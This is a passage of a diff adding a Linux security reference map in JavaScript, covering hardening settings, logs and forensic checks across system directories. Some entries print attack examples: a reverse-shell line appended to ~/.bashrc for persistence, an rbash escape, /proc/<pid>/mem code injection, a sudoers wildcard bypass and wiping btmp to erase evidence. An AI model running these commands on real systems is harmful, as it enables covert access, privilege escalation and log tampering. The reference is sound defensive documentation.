+  { path:'~/.config/environment.d/', desc:'User environment (systemd user sessions)', children:[
+    { name:'*.conf', desc:'VAR=value per line, loaded by systemd user instance', purpose:'Persistent user-level env — check for LD_PRELOAD injections' },
+  ]},
+],
+
+syscall_iface: [
+  { path:'/usr/include/asm/unistd_64.h', desc:'Syscall numbers for x86-64', children:[
+    { name:'unistd_64.h', desc:'#define __NR_read 0, __NR_write 1, __NR_open 2…', purpose:'Reference for seccomp filter writing and raw syscall use\nTotal ~450 syscalls on recent kernels' },
+  ]},
+  { path:'/proc/sys/kernel/', desc:'Syscall-related tunables', children:[
+    { name:'perf_event_paranoid', desc:'Controls perf_event_open() access', purpose:'-1=unrestricted, 0=allow counters, 1=allow basic, 2=root only, 3=none' },
+    { name:'yama/ptrace_scope', desc:'ptrace() restriction level', purpose:'0=any process, 1=children only, 2=admin, 3=disabled' },
+    { name:'unprivileged_userns_clone', desc:'Allow unprivileged user namespace creation', purpose:'0=disabled (more secure); 1=allowed (needed by browsers, containers)' },
+  ]},
+  { path:'/proc/<pid>/syscall', desc:'Current/last syscall for a process', children:[
+    { name:'(virtual file)', desc:'Format: syscall_num arg0 … arg5 sp pc', purpose:'Monitor: watch -n0.1 cat /proc/<pid>/syscall\nForensics: shows what a process is blocked on' },
+  ]},
+],
+
+net_stack: [
+  { path:'/proc/sys/net/', desc:'Network stack tunables (sysctl)', children:[
+    { name:'core/', desc:'Core socket and buffer settings', purpose:'',
+      children:[
+        { name:'rmem_max', desc:'Max receive socket buffer size (bytes)' },
+        { name:'wmem_max', desc:'Max send socket buffer size' },
+        { name:'netdev_max_backlog', desc:'Max packets queued before drop' },
+        { name:'somaxconn', desc:'Max listen() backlog (SYN queue depth)' },
+      ]
+    },
+    { name:'ipv4/', desc:'IPv4 protocol settings', purpose:'',
+      children:[
+        { name:'tcp_syncookies', desc:'Enable SYN cookies (SYN flood defence) — must be 1' },
+        { name:'ip_forward', desc:'Enable IP forwarding (router/NAT) — default 0' },
+        { name:'conf/all/accept_source_route', desc:'Disable source routing (set to 0)' },
+        { name:'conf/all/rp_filter', desc:'Reverse path filter: 1=strict, 2=loose, 0=off' },
+        { name:'conf/all/log_martians', desc:'Log packets with impossible source addr' },
+        { name:'tcp_timestamps', desc:'Enable TCP timestamps (info leak risk — set 0 or 1)' },
+      ]
+    },
+    { name:'ipv6/', desc:'IPv6 settings', purpose:'conf/all/disable_ipv6 = 1 to disable entirely' },
+  ]},
+  { path:'/proc/net/', desc:'Network state files', children:[
+    { name:'tcp', desc:'All IPv4 TCP sockets: local+remote addr, state, uid', purpose:'Columns: sl, local_address, rem_address, st, tx_queue:rx_queue, uid' },
+    { name:'tcp6', desc:'IPv6 TCP sockets', purpose:'Same format as tcp with 128-bit addresses' },
+    { name:'udp', desc:'UDP sockets', purpose:'Includes LISTEN and ESTABLISHED UDP' },
+    { name:'arp', desc:'ARP table: IP → MAC + interface', purpose:'ARP poisoning detection — compare with arp -n' },
+    { name:'dev', desc:'Per-interface TX/RX packet/byte/error counters', purpose:'Same data as ip -s link' },
+    { name:'nf_conntrack', desc:'Netfilter connection tracking (if loaded)', purpose:'Format: proto timeout src dst → ESTABLISHED|RELATED state' },
+    { name:'route', desc:'IPv4 routing table (hex)', purpose:'Use ip route or route -n for human-readable output' },
+  ]},
+  { path:'/etc/sysctl.conf', desc:'Persistent sysctl settings (applied at boot)', children:[
+    { name:'sysctl.conf', desc:'Key=value net/kernel/vm tunables', purpose:'net.ipv4.tcp_syncookies=1\nnet.ipv4.ip_forward=0\nkernel.randomize_va_space=2' },
+  ]},
+  { path:'/etc/sysctl.d/', desc:'Drop-in sysctl config files', children:[
+    { name:'99-sysctl.conf', desc:'Usually symlink to /etc/sysctl.conf', purpose:'Processed by systemd-sysctl.service at boot' },
+    { name:'10-network-security.conf', desc:'CIS benchmark network hardening settings', purpose:'rp_filter, log_martians, disable_source_route etc.' },
+  ]},
+],
+
+netfilter_node: [
+  { path:'/etc/nftables.conf', desc:'nftables ruleset (primary config)', children:[
+    { name:'nftables.conf', desc:'Defines tables, chains, rules in nft syntax', purpose:'Example:\ntable inet filter {\n  chain input {\n    type filter hook input priority 0; policy drop;\n    ct state established,related accept\n    tcp dport 22 accept\n  }\n}' },
+  ]},
+  { path:'/etc/iptables/', desc:'Legacy iptables persistent rules', children:[
+    { name:'rules.v4', desc:'IPv4 rules saved by iptables-save', purpose:'Loaded at boot by iptables-restore < /etc/iptables/rules.v4' },
+    { name:'rules.v6', desc:'IPv6 rules saved by ip6tables-save', purpose:'Same as above for IPv6' },
+  ]},
+  { path:'/proc/net/', desc:'Netfilter runtime state', children:[
+    { name:'nf_conntrack', desc:'Active connection tracking entries', purpose:'cat /proc/net/nf_conntrack | head -5 to inspect state table' },
+    { name:'ip_tables_names', desc:'Loaded iptables table names (filter, nat, mangle)', purpose:'Verify which tables are active' },
+  ]},
+  { path:'/sys/module/nf_conntrack/parameters/', desc:'conntrack tunables via sysfs', children:[
+    { name:'hashsize', desc:'Hash table size for conntrack entries', purpose:'echo 65536 > /sys/module/nf_conntrack/parameters/hashsize' },
+  ]},
+],
+
+pam_node: [
+  { path:'/etc/pam.d/', desc:'Per-service PAM stack configurations', children:[
+    { name:'common-auth', desc:'Shared auth stack (included by most services)', purpose:'pam_faillock.so preauth deny=5\npam_unix.so nullok\npam_faillock.so authfail' },
+    { name:'common-account', desc:'Account checks (expiry, lock)', purpose:'pam_unix.so\npam_permit.so' },
+    { name:'common-session', desc:'Session setup (homedir, limits, keyring)', purpose:'pam_unix.so\npam_umask.so\npam_systemd.so' },
+    { name:'common-password', desc:'Password change rules', purpose:'pam_pwquality.so retry=3 minlen=12\npam_unix.so obscure sha512 shadow' },
+    { name:'sshd', desc:'SSH daemon PAM stack', purpose:'Overrides: @include common-auth\nOptional: pam_google_authenticator.so' },
+    { name:'sudo', desc:'sudo PAM stack', purpose:'@include common-auth\nTimestamp cache controlled by timestamp_timeout' },
+    { name:'login', desc:'Console login PAM stack', purpose:'Includes tally, securetty, motd, lastlog' },
+    { name:'su', desc:'su command PAM stack', purpose:'pam_rootok.so (allows root to su without password)' },
+  ]},
+  { path:'/etc/security/', desc:'PAM module configuration files', children:[
+    { name:'limits.conf', desc:'Resource limits applied on login', purpose:'Format: user/group hard/soft resource value\n* hard nofile 65535\n* soft nproc 1024' },
+    { name:'limits.d/', desc:'Drop-in limits files', purpose:'90-nproc.conf, 10-docker.conf etc.' },
+    { name:'pwquality.conf', desc:'Password quality rules (pam_pwquality)', purpose:'minlen=12, dcredit=-1, ucredit=-1, lcredit=-1, ocredit=-1' },
+    { name:'access.conf', desc:'Login access rules (pam_access)', purpose:'+ : admin : ALL\n- : ALL : ALL' },
+    { name:'time.conf', desc:'Time-based access control (pam_time)', purpose:'login;*;admin;Al0000-2400 → allow admin logins always' },
+    { name:'faillock.conf', desc:'Account lockout config (pam_faillock)', purpose:'deny=5, unlock_time=900, fail_interval=900' },
+  ]},
+  { path:'/lib/security/', desc:'PAM module shared objects', children:[
+    { name:'pam_unix.so', desc:'Traditional UNIX auth (/etc/shadow)', purpose:'Core module — password hashing, account info' },
+    { name:'pam_faillock.so', desc:'Login failure counting and lockout', purpose:'Replaces deprecated pam_tally2' },
+    { name:'pam_pwquality.so', desc:'Password strength checking', purpose:'Links to libpwquality — enforces complexity rules' },
+    { name:'pam_systemd.so', desc:'Registers session with systemd-logind', purpose:'Creates /run/user/<uid>, sets XDG_RUNTIME_DIR' },
+    { name:'pam_limits.so', desc:'Apply /etc/security/limits.conf on login', purpose:'Sets ulimits for the session' },
+    { name:'pam_google_authenticator.so', desc:'TOTP 2FA module', purpose:'Reads ~/.google_authenticator; validates time-based OTP' },
+  ]},
+  { path:'/etc/passwd and /etc/shadow', desc:'User account database', children:[
+    { name:'/etc/passwd', desc:'Usernames, UIDs, GIDs, homedir, shell (world-readable)', purpose:'Format: user:x:1000:1000:Full Name:/home/user:/bin/bash\nx = password hash in /etc/shadow' },
+    { name:'/etc/shadow', desc:'Hashed passwords (root-readable only)', purpose:'Format: user:$6$salt$hash:lastchg:min:max:warn:inactive:expire\n$6$ = SHA-512, $5$ = SHA-256, $1$ = MD5 (insecure!)' },
+    { name:'/etc/group', desc:'Group definitions', purpose:'Format: groupname:x:gid:member1,member2\nCheck: id, groups, getent group sudo' },
+    { name:'/etc/gshadow', desc:'Group passwords and admin list (rarely used)', purpose:'Root-readable; check for group backdoors' },
+  ]},
+],
+
+ssh_node: [
+  { path:'/etc/ssh/', desc:'System-wide SSH configuration', children:[
+    { name:'sshd_config', desc:'sshd daemon configuration', purpose:'Critical hardening settings:\nPermitRootLogin no\nPasswordAuthentication no\nAllowUsers admin deploy\nMaxAuthTries 3\nClientAliveInterval 300\nClientAliveCountMax 2' },
+    { name:'ssh_config', desc:'System-wide SSH client defaults', purpose:'ServerAliveInterval 60\nHashKnownHosts yes\nStrictHostKeyChecking ask' },
+    { name:'sshd_config.d/', desc:'Drop-in sshd config files (Included by sshd_config)', purpose:'Override specific options per deployment context' },
+    { name:'ssh_host_rsa_key', desc:'RSA host private key (root-readable only)', purpose:'Fingerprint shown to clients on first connect (TOFU)' },
+    { name:'ssh_host_ed25519_key', desc:'Ed25519 host private key (preferred)', purpose:'Smaller, faster, more secure than RSA' },
+    { name:'ssh_host_*_key.pub', desc:'Corresponding public host keys', purpose:'Can be published via DNS SSHFP records' },
+    { name:'moduli', desc:'DH group parameters for key exchange', purpose:'Remove weak groups: awk "$5 >= 3071" /etc/ssh/moduli > /etc/ssh/moduli.safe' },
+    { name:'authorized_principals', desc:'Per-user principal list for cert auth', purpose:'Used with SSH certificates instead of authorized_keys' },
+  ]},
+  { path:'~/.ssh/', desc:'Per-user SSH configuration and keys', children:[
+    { name:'authorized_keys', desc:'Public keys allowed to log in as this user', purpose:'Format: [options] keytype base64key [comment]\nPersistence vector: attacker appends their pubkey here\ncheck: ls -la ~/.ssh/authorized_keys; cat ~/.ssh/authorized_keys' },
+    { name:'known_hosts', desc:'Fingerprints of previously connected hosts', purpose:'HashKnownHosts yes → hashes hostnames for privacy\nClear stale: ssh-keygen -R hostname' },
+    { name:'id_ed25519', desc:'User Ed25519 private key (mode 600!)', purpose:'Passphrase-protected strongly recommended\nCheck: ls -l ~/.ssh/id_* — should be 600, not world-readable' },
+    { name:'id_ed25519.pub', desc:'User Ed25519 public key', purpose:'Contents go into remote authorized_keys\nFingerprint: ssh-keygen -lf ~/.ssh/id_ed25519.pub' },
+    { name:'config', desc:'Per-host client configuration', purpose:'Host bastion\n  HostName 10.0.0.1\n  User deploy\n  IdentityFile ~/.ssh/deploy_key\n  ProxyJump jump-server' },
+    { name:'environment', desc:'Environment variables set for SSH sessions', purpose:'Requires PermitUserEnvironment yes in sshd_config (disabled by default)' },
+  ]},
+  { path:'/var/log/', desc:'SSH authentication logs', children:[
+    { name:'auth.log (Debian/Ubuntu)', desc:'All PAM+SSH authentication events', purpose:'grep sshd /var/log/auth.log | grep Failed → brute force detection\ngrep "Accepted publickey" → successful logins' },
+    { name:'secure (RHEL/CentOS)', desc:'Equivalent of auth.log on Red Hat systems', purpose:'Same content, different filename' },
+    { name:'wtmp', desc:'Binary login/logout records', purpose:'Read with last -F; used by forensic timeline tools' },
+    { name:'btmp', desc:'Binary failed login records', purpose:'Read with lastb; shows brute force attempts' },
+    { name:'lastlog', desc:'Last login per user (binary)', purpose:'Read with lastlog; manipulated by attackers — check wtmp too' },
+  ]},
+],
+
+systemd_node: [
+  { path:'/lib/systemd/system/', desc:'Vendor unit files (distro-provided)', children:[
+    { name:'sshd.service', desc:'OpenSSH server daemon', purpose:'ExecStart=/usr/sbin/sshd -D\nWantedBy=multi-user.target' },
+    { name:'cron.service', desc:'Periodic command scheduler (cron daemon)', purpose:'ExecStart=/usr/sbin/cron -f' },
+    { name:'NetworkManager.service', desc:'Network connection manager', purpose:'Manages wired/wireless/VPN connections' },
+    { name:'dbus.service', desc:'D-Bus message bus daemon', purpose:'Required by almost all desktop and system services' },
+    { name:'auditd.service', desc:'Linux audit daemon', purpose:'ExecStart=/sbin/auditd -n; must start early' },
+    { name:'docker.service', desc:'Docker container engine', purpose:'ExecStart=/usr/bin/dockerd → pulls in containerd' },
+    { name:'*.socket', desc:'Socket activation units', purpose:'systemd listens on socket, starts service on first connection\nExample: ssh.socket → activates sshd.service' },
+    { name:'*.timer', desc:'Calendar/monotonic timer units', purpose:'Replaces cron: OnCalendar=daily, OnBootSec=5min' },
+    { name:'*.target', desc:'Synchronisation/grouping units', purpose:'multi-user.target ≈ runlevel 3; graphical.target ≈ runlevel 5' },
+    { name:'*.mount', desc:'Filesystem mount units', purpose:'Auto-generated from /etc/fstab or manual for exotic mounts' },
+  ]},
+  { path:'/etc/systemd/system/', desc:'Admin unit files (override vendor)', children:[
+    { name:'<service>.d/', desc:'Drop-in override directory', purpose:'Create 99-override.conf inside:\n[Service]\nRestart=always\nEnvironment=FOO=bar' },
+    { name:'multi-user.target.wants/', desc:'Symlinks to enabled services', purpose:'systemctl enable creates symlinks here\ncheck: ls /etc/systemd/system/*.wants/' },
+    { name:'default.target', desc:'Symlink defining default boot target', purpose:'→ multi-user.target or graphical.target' },
+  ]},
+  { path:'/run/systemd/', desc:'Runtime state (cleared on reboot)', children:[
+    { name:'private/', desc:'Private systemd data (SMACK labels etc.)', purpose:'Not user-accessible' },
+    { name:'system/', desc:'Runtime-generated unit files', purpose:'Created by systemd-run or transient services' },
+    { name:'transient/', desc:'Transient units (systemd-run --runtime)', purpose:'Disappear after deactivation; not persisted' },
+    { name:'journal/', desc:'Journal data (if not in /var/log/journal)', purpose:'Volatile journal (cleared on reboot) if /var/log/journal does not exist' },
+    { name:'sessions/', desc:'PAM/logind session files', purpose:'One per logged-in session; contains UID, seat, leader PID' },
+  ]},
+  { path:'/etc/systemd/journald.conf', desc:'journald logging configuration', children:[
+    { name:'journald.conf', desc:'Storage, compression, rate limit, forwarding settings', purpose:'Storage=persistent → write to /var/log/journal/\nForwardToSyslog=yes → send to rsyslog\nRateLimitBurst=1000, RateLimitIntervalSec=30s' },
+  ]},
+  { path:'/var/log/journal/', desc:'Persistent journal storage', children:[
+    { name:'<machine-id>/', desc:'Per-machine journal directory', purpose:'system.journal → kernel + system messages\nuser-<uid>.journal → per-user session logs' },
+  ]},
+],
+
+shell_node: [
+  { path:'/etc/', desc:'System-wide shell configuration', children:[
+    { name:'profile', desc:'Executed for all login shells (sh-compatible)', purpose:'Sets PATH, UMASK, sources /etc/profile.d/*.sh' },
+    { name:'profile.d/', desc:'Drop-in scripts sourced by /etc/profile', purpose:'',
+      children:[
+        { name:'apps-bin-path.sh', desc:'Adds app-specific dirs to PATH' },
+        { name:'bash_completion.sh', desc:'Enables bash tab-completion' },
+        { name:'umask.sh', desc:'Sets default umask for login sessions' },
+        { name:'Z97-byobu.sh', desc:'Byobu terminal multiplexer init (if installed)' },
+      ]
+    },
+    { name:'bash.bashrc', desc:'System-wide bashrc for interactive bash', purpose:'Sourced for every interactive non-login bash shell' },
+    { name:'environment', desc:'PAM environment variables (key=value)', purpose:'Loaded by pam_env.so — affects all login sessions regardless of shell' },
+    { name:'shells', desc:'List of valid login shells', purpose:'chsh checks this; su -s /bin/zsh checks against /etc/shells' },
+    { name:'skel/', desc:'Template files copied to new user homedirs', purpose:'.bashrc, .bash_profile, .profile — check for pre-planted backdoors here' },
+  ]},
+  { path:'~/ (user homedir)', desc:'Per-user shell configuration', children:[
+    { name:'.bashrc', desc:'Non-login interactive bash config', purpose:'Persistence: echo "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1" >> ~/.bashrc\nAlso: exports, aliases, PS1, history settings\nHISTFILESIZE=0 → disables history (attacker evasion)' },
+    { name:'.bash_profile', desc:'Login shell config (bash-specific)', purpose:'Typically: [ -f ~/.bashrc ] && . ~/.bashrc\nSources .bashrc for login shells' },
+    { name:'.profile', desc:'Login shell config (POSIX sh, used by sh/dash)', purpose:'Sourced when bash_profile not present; also used by X session managers' },
+    { name:'.bash_logout', desc:'Executed when bash login shell exits', purpose:'Persistence: command planted here runs on logout (rare but real)' },
+    { name:'.bash_history', desc:'Command history (HISTSIZE entries)', purpose:'Forensics goldmine:\ngrep -i "ssh\|wget\|curl\|nc\|ncat" ~/.bash_history\nCheck: HISTTIMEFORMAT="%F %T " for timestamps' },
+    { name:'.zshrc / .zshenv', desc:'Zsh equivalents of .bashrc/.profile', purpose:'.zshenv loaded for ALL zsh instances (including scripts)\n.zshrc only for interactive shells' },
+  ]},
+  { path:'/bin/ and /usr/bin/', desc:'Shell binaries', children:[
+    { name:'bash', desc:'GNU Bourne Again SHell', purpose:'Most common default shell; /bin/bash or /usr/bin/bash\n--norc, --noprofile flags bypass config loading' },
+    { name:'sh → dash (Debian)', desc:'POSIX sh (dash on Debian/Ubuntu)', purpose:'Faster than bash; used for /etc/init.d scripts\ndash does not load .bashrc — important for scripts' },
+    { name:'zsh', desc:'Z Shell — extended feature set', purpose:'Used by oh-my-zsh; macOS default since 10.15' },
+    { name:'rbash', desc:'Restricted bash (symlink to bash)', purpose:'Restricts: cd, PATH change, redirects, command with /\nEscape: python3 -c "import os;os.system(\'/bin/bash\')"' },
+    { name:'busybox', desc:'Multi-call binary with minimal shell', purpose:'Used in initramfs, embedded, containers\nbusybox sh — POSIX sh subset' },
+  ]},
+],
+
+process_node: [
+  { path:'/proc/<pid>/', desc:'Complete process state (replace <pid> with PID)', children:[
+    { name:'maps', desc:'VMA layout: address, permissions, backing file', purpose:'forensics: find injected regions (r-xp with no file backing)\nsecurity: leaked addresses = ASLR bypass' },
+    { name:'mem', desc:'Process address space — direct R/W', purpose:'echo 0x… | xxd | dd of=/proc/<pid>/mem → code injection\nRequires: ptrace capability or same UID (and ptrace_scope=0)' },
+    { name:'environ', desc:'Environment at exec() time (\0 delimited)', purpose:'Dump: cat /proc/<pid>/environ | tr "\\0" "\\n"\nContains: PATH, LD_PRELOAD, API keys, passwords in env vars' },
+    { name:'cmdline', desc:'Full argv (\0 delimited)', purpose:'cat /proc/<pid>/cmdline | tr "\\0" " "' },
+    { name:'fd/', desc:'Open file descriptors (symlinks)', purpose:'ls -la /proc/<pid>/fd → reveals sockets, pipes, open files\nInherit-on-fork attack: check for unintentionally inherited fds' },
+    { name:'fdinfo/', desc:'Per-fd flags and position', purpose:'flags, pos, mnt_id per fd\nDetect O_CLOEXEC not set (fd leaked across exec)' },
+    { name:'status', desc:'Human-readable state: UID, GID, caps, memory', purpose:'CapEff, CapPrm, CapBnd lines → decode with capsh --decode=\nRead: VmRSS (resident), VmSwap (swapped out)' },
+    { name:'syscall', desc:'Active syscall number + args + sp + pc', purpose:'Monitor: cat /proc/<pid>/syscall 100 times/sec\nForensics: what is this process blocked on?' },
+    { name:'loginuid', desc:'Audit login UID (set once, immutable)', purpose:'Even if process escalates to root, loginuid stays original user\nForensics: who originally started this process chain?' },
+    { name:'ns/', desc:'Namespace symlinks (pid, net, mnt, user…)', purpose:'ls -la /proc/<pid>/ns → compare inode numbers to check if same namespace\nContainer breakout check: compare with /proc/1/ns/pid' },
+    { name:'cgroup', desc:'cgroup membership', purpose:'Shows which cgroup hierarchy this process belongs to\nForensics: identify container vs host process' },
+    { name:'oom_score', desc:'OOM killer score (0–1000)', purpose:'Higher = more likely to be killed under memory pressure\nProtect: echo -1000 > /proc/<pid>/oom_score_adj' },
+  ]},
+],
+
+cgroups_node: [
+  { path:'/sys/fs/cgroup/', desc:'cgroup v2 unified hierarchy root', children:[
+    { name:'cgroup.controllers', desc:'Available controllers at root', purpose:'memory cpu io pids cpuset → all available in v2' },
+    { name:'cgroup.procs', desc:'PIDs in root cgroup (should be empty except PID 1)', purpose:'echo <pid> > /sys/fs/cgroup/<subgroup>/cgroup.procs to move process' },
+    { name:'memory.stat', desc:'Root-level memory statistics', purpose:'cache, rss, mapped_file, pgfault, pgmajfault per cgroup' },
+    { name:'<service>.service/', desc:'Per-service systemd cgroup (e.g. docker.service/)', purpose:'',
+      children:[
+        { name:'cgroup.procs', desc:'PIDs in this cgroup' },
+        { name:'memory.current', desc:'Current memory usage (bytes)' },
+        { name:'memory.max', desc:'Hard memory limit (OOM kill threshold)' },
+        { name:'memory.high', desc:'Soft limit (throttle but no kill)' },
+        { name:'cpu.stat', desc:'usage_usec, user_usec, system_usec' },
+        { name:'io.stat', desc:'Per-device rbytes, wbytes, rios, wios' },
+      ]
+    },
+  ]},
+],
+
+sudo_node: [
+  { path:'/etc/sudoers', desc:'Main sudo policy file (edit only with visudo!)', children:[
+    { name:'sudoers', desc:'Defines who can run what as whom', purpose:'Syntax:\n# User privilege specification\nroot ALL=(ALL:ALL) ALL\n\n# Members of sudo group\n%sudo ALL=(ALL:ALL) ALL\n\n# Dangerous — no password:\ndeploy ALL=(ALL) NOPASSWD: /usr/bin/docker\n\n# Wildcard abuse:\ndeploy ALL=(ALL) /usr/bin/vim /etc/*  ← bypass: vim /etc/passwd' },
+  ]},
+  { path:'/etc/sudoers.d/', desc:'Drop-in sudoers files (included by #includedir)', children:[
+    { name:'90-cloud-init-users', desc:'Cloud provider created rules (often too permissive)', purpose:'Check: sudo cat /etc/sudoers.d/* | grep NOPASSWD' },
+    { name:'README', desc:'Documents the includedir mechanism', purpose:'Not a rules file — just documentation' },
+  ]},
+  { path:'/var/log/', desc:'Sudo audit trail', children:[
+    { name:'auth.log', desc:'sudo command executions', purpose:'grep sudo /var/log/auth.log → full audit trail\nFormat: user : TTY=pts/0 ; PWD=/home/user ; USER=root ; COMMAND=/bin/bash' },
+    { name:'sudo_logsrvd (optional)', desc:'Dedicated sudo I/O log server', purpose:'sudo_logsrvd.conf → centralized sudo I/O logging' },
+  ]},
+  { path:'/var/lib/sudo/lectured/', desc:'Sudo lecture tracking', children:[
+    { name:'<username>', desc:'Empty file marking that user was shown sudo lecture', purpose:'Delete to force sudo lecture again; check for unexpected entries' },
+  ]},
+  { path:'/run/sudo/ts/', desc:'Sudo timestamp files (authentication cache)', children:[
+    { name:'<username>', desc:'Timestamp of last successful sudo auth', purpose:'sudo caches auth for timestamp_timeout minutes (default 5)\nAttack: /proc/<sudo_pid>/mem write to hijack timestamp\nForce expire: sudo -K' },
+  ]},
+],
+
+selinux_node: [
+  { path:'/etc/selinux/', desc:'SELinux configuration', children:[
+    { name:'config', desc:'Main SELinux config: SELINUX= and SELINUXTYPE=', purpose:'SELINUX=enforcing|permissive|disabled\nSELINUXTYPE=targeted|mls\nDisabled requires reboot and relabel' },
+    { name:'targeted/policy/', desc:'Compiled policy binary', purpose:'policy.31 (or .32/.33) — version matches kernel SELinux version' },
+    { name:'targeted/contexts/', desc:'Default security contexts', purpose:'',
+      children:[
+        { name:'files/file_contexts', desc:'Default context per path pattern (used by restorecon)' },
+        { name:'default_contexts', desc:'Default context for login sessions' },
+        { name:'users/unconfined_u', desc:'Context for unconfined (admin) users' },
+      ]
+    },
+    { name:'targeted/logins/', desc:'SELinux user → Linux user mappings', purpose:'Maps Linux usernames to SELinux user identities' },
+  ]},
+  { path:'/sys/fs/selinux/', desc:'SELinux runtime kernel interface', children:[
+    { name:'enforce', desc:'Current mode: 1=enforcing, 0=permissive', purpose:'echo 0 > /sys/fs/selinux/enforce → sets permissive (requires root + policy loaded)' },
+    { name:'policy', desc:'Read-only: currently loaded compiled policy', purpose:'Read by selinux-aware tools; write new policy to load it' },
+    { name:'access', desc:'Access decision interface (security_compute_av)', purpose:'libselinux queries this for every access check' },
+    { name:'load', desc:'Write new policy binary here to load it', purpose:'semodule -i my_module.pp writes here internally' },
+  ]},
+  { path:'/var/log/audit/audit.log', desc:'AVC denials and policy audit events', children:[
+    { name:'audit.log', desc:'SELinux access denials (type=AVC)', purpose:'Example: type=AVC msg=audit(…): avc: denied { open } for pid=1234 comm="nginx" name="secret" scontext=… tcontext=…\n→ parse with: audit2allow -a → generate allow rules' },
+  ]},
+],
+
+audit_node: [
+  { path:'/etc/audit/', desc:'auditd configuration', children:[
+    { name:'auditd.conf', desc:'Daemon configuration', purpose:'log_file=/var/log/audit/audit.log\nmax_log_file=50 (MB)\nmax_log_file_action=ROTATE\nspace_left_action=SYSLOG\ndisk_full_action=HALT ← halt if disk full (prevents log loss)' },
+    { name:'audit.rules', desc:'Legacy static rules file (loaded at boot)', purpose:'Written by service from /etc/audit/rules.d/ contents' },
+    { name:'rules.d/', desc:'Drop-in rule files (recommended)', purpose:'',
+      children:[
+        { name:'10-base-config.rules', desc:'Delete old rules, set buffer size' },
+        { name:'20-dont-audit.rules', desc:'Suppress noisy false positives' },
+        { name:'30-stig.rules', desc:'STIG/CIS compliance rules' },
+        { name:'40-local.rules', desc:'Custom local rules' },
+        { name:'99-finalize.rules', desc:'-e 2 → make rules immutable (reboot to change)' },
+      ]
+    },
+  ]},
+  { path:'/var/log/audit/', desc:'Audit log storage', children:[
+    { name:'audit.log', desc:'Current audit log', purpose:'Fields: type= msg= (timestamp:serial) …\nKey types: AVC, SYSCALL, PATH, EXECVE, USER_AUTH, USER_CMD' },
+    { name:'audit.log.1 … .N', desc:'Rotated log files', purpose:'Controlled by max_log_file and num_logs in auditd.conf' },
+  ]},
+  { path:'/var/log/', desc:'Syslog and auth logs', children:[
+    { name:'auth.log', desc:'Authentication events (PAM, sudo, SSH, su)', purpose:'grep "sudo\|FAILED\|Invalid user\|Accepted" /var/log/auth.log' },
+    { name:'syslog', desc:'General system messages (rsyslog)', purpose:'Most daemons log here unless they use journald directly' },
+    { name:'kern.log', desc:'Kernel ring buffer messages', purpose:'OOM kills, hardware errors, module load/unload' },
+    { name:'dpkg.log', desc:'Package install/remove/upgrade history', purpose:'Forensics: when were tools installed? (apt, dpkg)' },
+    { name:'lastlog', desc:'Per-user last login (binary)', purpose:'lastlog command; manipulation attack: overwrite with zeros' },
+    { name:'wtmp', desc:'Login/logout history (binary)', purpose:'last -F → full history with dates\nlast -i → shows IP addresses' },
+    { name:'btmp', desc:'Failed login attempts (binary)', purpose:'lastb → brute force detection\nReset: > /var/log/btmp (erase evidence attack)' },
+  ]},
+],
+
+tpm_node: [
+  { path:'/dev/', desc:'TPM device nodes', children:[
+    { name:'tpm0', desc:'TPM character device (requires root or tss group)', purpose:'Direct communication via ioctl; used by tpm2-tools' },
+    { name:'tpmrm0', desc:'TPM resource manager (preferred interface)', purpose:'Multiplexes concurrent access; use instead of /dev/tpm0' },
+  ]},
+  { path:'/sys/class/tpm/tpm0/', desc:'TPM sysfs interface', children:[
+    { name:'pcr-sha256/', desc:'Current PCR values (SHA-256 bank)', purpose:'cat pcr-sha256/0 → read PCR 0 value (UEFI firmware measurement)' },
+    { name:'tpm_version_major', desc:'TPM spec version (1 or 2)', purpose:'Verify TPM2 before using tpm2-tools' },
+    { name:'caps', desc:'TPM capabilities string', purpose:'Reports supported algorithms, PCR banks' },
+  ]},
+  { path:'/sys/kernel/security/', desc:'Linux Security Module interfaces', children:[
+    { name:'ima/', desc:'IMA (Integrity Measurement Architecture)', purpose:'',
+      children:[
+        { name:'ascii_runtime_measurements', desc:'Human-readable IMA log (hash + filepath per entry)' },
+        { name:'binary_bios_measurements', desc:'Binary TPM event log from firmware' },
+        { name:'policy', desc:'Write IMA policy rules here (once, before boot completes ideally)' },
+      ]
+    },
+    { name:'evm/', desc:'EVM HMAC key management', purpose:'evm_xattr_hmac_version, evm_key_refs' },
+  ]},
+],
+
+sec_mech: [
+  { path:'/proc/sys/kernel/', desc:'Kernel security parameter tunables', children:[
+    { name:'randomize_va_space', desc:'ASLR level: 0=off, 1=partial, 2=full', purpose:'Must be 2; check: sysctl kernel.randomize_va_space' },
+    { name:'kptr_restrict', desc:'Hide kernel pointers: 0/1/2', purpose:'Set 2: all /proc/kallsyms entries show 0x0 for non-root' },
+    { name:'dmesg_restrict', desc:'1 = only root can read dmesg', purpose:'Prevents info leak of kernel addresses from boot messages' },
+    { name:'perf_event_paranoid', desc:'Restrict perf_event_open()', purpose:'Set 3 (or 2): blocks unprivileged hardware performance counters' },
+    { name:'yama/ptrace_scope', desc:'1 = only parent can ptrace child', purpose:'Prevents injection attacks: ptrace_scope=1 or 2' },
+    { name:'unprivileged_userns_clone', desc:'0 = no unprivileged user namespaces', purpose:'Disabling prevents many container-assisted LPE chains' },
+  ]},
+  { path:'/proc/sys/kernel/unprivileged_bpf_disabled', desc:'eBPF access control', children:[
+    { name:'unprivileged_bpf_disabled', desc:'0=allow, 1=root-only, 2=root-only+immutable', purpose:'Set 1: prevents eBPF LPE exploits by unprivileged users' },
+  ]},
+  { path:'/proc/<pid>/status (cap fields)', desc:'Process capability sets', children:[
+    { name:'CapInh', desc:'Inheritable set (hex bitmask)', purpose:'decode: capsh --decode=$(cat /proc/<pid>/status | grep CapInh | awk "{print $2}")' },
+    { name:'CapPrm', desc:'Permitted set', purpose:'Maximum caps this process can have' },
+    { name:'CapEff', desc:'Effective set (actually enforced)', purpose:'Capabilities currently in use for access checks' },
+    { name:'CapBnd', desc:'Bounding set (ceiling)', purpose:'Cannot gain caps outside this set via any means' },
+    { name:'CapAmb', desc:'Ambient set (preserved across exec without SUID)', purpose:'New in kernel 4.3; allows non-root exec to inherit caps' },
+  ]},
+  { path:'/usr/include/linux/capability.h', desc:'Capability definitions', children:[
+    { name:'CAP_NET_RAW (13)', desc:'Use raw/packet sockets; bind to any port', purpose:'Required for: tcpdump, ping (historically), Wireshark\nAttack: raw socket sniffing without root' },
+    { name:'CAP_SYS_PTRACE (19)', desc:'ptrace() any process', purpose:'Equivalent to root for code injection\nDrop in containers: --cap-drop=SYS_PTRACE' },
+    { name:'CAP_SYS_ADMIN (21)', desc:'Broad admin capability (the new root)', purpose:'mount, sethostname, keyctl, many ioctl calls\nMost container escapes require this' },
